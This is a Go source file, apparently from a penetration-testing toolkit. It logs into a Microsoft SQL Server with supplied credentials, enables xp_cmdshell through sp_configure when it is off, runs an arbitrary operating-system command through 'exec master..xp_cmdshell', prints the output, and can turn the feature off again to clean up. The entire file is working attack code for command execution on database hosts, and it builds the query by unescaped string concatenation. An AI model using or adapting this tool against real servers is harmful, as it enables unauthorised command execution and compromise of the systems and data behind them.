//From: https://github.com/mabangde/pentesttools/blob/master/golang/sqltool.go
package sqlcmd

import (
	"cube/log"
	"cube/model"
	"database/sql"
	"fmt"
	_ "github.com/denisenkom/go-mssqldb"
)

func Mssql(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
	result = model.SqlcmdTaskResult{SqlcmdTask: task, Result: "", Err: nil}

	dataSourceName := fmt.Sprintf("server=%v;port=%v;user id=%v;password=%v;database=%v", task.Ip,
		task.Port, task.User, task.Password, "tempdb")
	conn, err := sql.Open("mssql", dataSourceName)
	defer conn.Close()
	if err != nil {
		log.Error(err.Error())
	}
	if task.Query == "clear" {
		closeCmdShell(*conn)
		fmt.Println("Clear xp_cmdshell Successful")
		return
	}
	Open(*conn)
	osShell(*conn, task.Query)

	return result
}

func Open(conn sql.DB) {
	value, err := conn.Prepare("select value_in_use from  sys.configurations where  name = 'xp_cmdshell'")
	if err != nil {
		log.Error("Prepare failed:", err.Error())
	}
	defer value.Close()

	row := value.QueryRow()
	//var somenumber int64
	var v int
	err = row.Scan(&v)
	if err != nil {
		log.Error("Query failed:", err.Error())
	}
	if v == 1 {
		fmt.Printf("xp_cmdshell Enabled\n")
	} else {
		fmt.Printf("Open xp_cmdshell...\n")
		stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
		if err != nil {
			//fmt.Println("Query Error", err)
			return
		}

		defer stmt.Close()
		stmt.Query()

	}
	return
}

func osShell(conn sql.DB, cmd string) {
	rows, err := conn.Query(`exec master..xp_cmdshell '` + cmd + `' `)
	if err != nil {
		panic(err.Error())

	}
	defer rows.Close()

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}
	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	for i := range values {
		scanArgs[i] = &values[i]
	}

	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string
		for _, col := range values {
			if col == nil {
				value = ""
			} else {
				value = string(col)
			}
			fmt.Println(value)

		}

	}
	if err = rows.Err(); err != nil {
		panic(err.Error()) // proper error handling instead of panic in your app
	}
}

func closeCmdShell(conn sql.DB) {
	stmt, err := conn.Prepare("EXEC sp_configure 'show advanced options', 0;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;")

	if err != nil {
		log.Error("Prepare failed:", err.Error())
	}
	stmt.Query()
	defer stmt.Close()
}
